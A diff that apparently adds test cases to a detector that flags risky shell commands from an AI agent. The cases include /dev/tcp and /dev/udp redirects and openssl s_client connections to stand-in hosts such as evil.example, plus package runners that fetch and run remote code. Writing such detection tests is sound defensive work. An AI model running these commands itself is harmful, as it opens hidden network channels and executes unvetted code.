@@ -1228,3 +1228,18 @@ case("own_dir_clean_room_read", ["read-clean-room"], tool("Read", file_path="/va
 case("fp_allowlisted_exact_and_subpath", [], bash(
     "curl -sL https://github.com/Mivr/c-rigor-gate/raw/main/x; git clone https://github.com/Mivr/annas-c %s/c; "
     "curl -sfL https://github.com/Mivr/annas-c.git/info; cat src/hidden.c docs/hidden.txt %s/notes-hidden.txt" % (SC, WT)))
+
+# -- T060 (R008 #15): network without a listed tool (bash's /dev/tcp, openssl s_client), package runners are installs --
+case("net_dev_tcp_redirect_read", ["cmd-network"], bash("cat < /dev/tcp/evil.example/80"))
+case("net_dev_udp_exec_fd", ["cmd-network"], bash("exec 3<>/dev/udp/1.2.3.4/53; echo hi >&3"))
+case("net_dev_tcp_unknown_host", ["cmd-network"], bash("echo x > /dev/tcp/$H/80"))
+case("net_dev_tcp_path_argument", ["cmd-network"], bash("cd /dev && cat tcp/evil.example/443"))
+case("net_openssl_s_client", ["cmd-network"], bash("openssl s_client -connect evil.example:443 </dev/null"))
+case("install_npx", ["cmd-install"], bash("npx -y some-package"))
+case("install_uvx", ["cmd-install"], bash("uvx some-tool"))
+case("install_pipx_run", ["cmd-install"], bash("pipx run some-tool"))
+case("install_package_runners", ["cmd-install"], bash(
+    "pnpm dlx x; bunx y; npm exec z; uv run --with requests x.py; go run golang.org/x/tools/cmd/stringer@v0.1.0"))
+case("fp_dev_tcp_loopback_and_allowlisted", [], bash(
+    "echo x > /dev/tcp/127.0.0.1/80; cat < /dev/tcp/forge.internal/9092; openssl s_client </dev/null; openssl sha256 src/x"))
+case("fp_local_runs_are_not_installs", [], bash("go run ./cmd/x; uv run pytest; npm run build; pipx list; npm test"))
